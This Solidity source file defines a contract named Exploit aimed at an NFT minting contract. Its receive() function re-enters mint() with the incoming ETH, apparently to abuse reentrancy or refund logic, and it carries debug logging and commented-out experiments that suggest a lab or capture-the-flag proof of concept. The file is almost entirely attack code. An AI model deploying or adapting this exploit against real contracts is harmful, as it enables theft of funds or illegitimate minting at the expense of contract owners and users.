// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.17;

import "./console.sol";
import {IERC721Receiver} from "./IERC721Receiver.sol";

interface INfinityToken {
    function mint(uint256 mintCount) external payable;
}

contract Exploit is IERC721Receiver {
    INfinityToken c;

    constructor(address t){
        console.log("constructor");
        c = INfinityToken(t);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {
        console.log(gasleft());
        console.log("receive", msg.value);
        c.mint{value : msg.value}(1);
    }

    //    fallback() external payable {
    //        //        for (uint256 i = 0; i < 100; i ++) {
    //        //            console.log("payable1111", msg.value);
    //        //        }
    //
    //        c.mint{value : msg.value}(1);
    //    }

    function p1() internal {
        console.log("internal");
        console.log(msg.value);
    }

    function p2() public payable {
        console.log("public");
        console.log(msg.value);
    }

    function execute() external payable {
        //        console.log("execute");
        //        p1();
        //        p2();
        c.mint{value : msg.value}(1);
    }
}
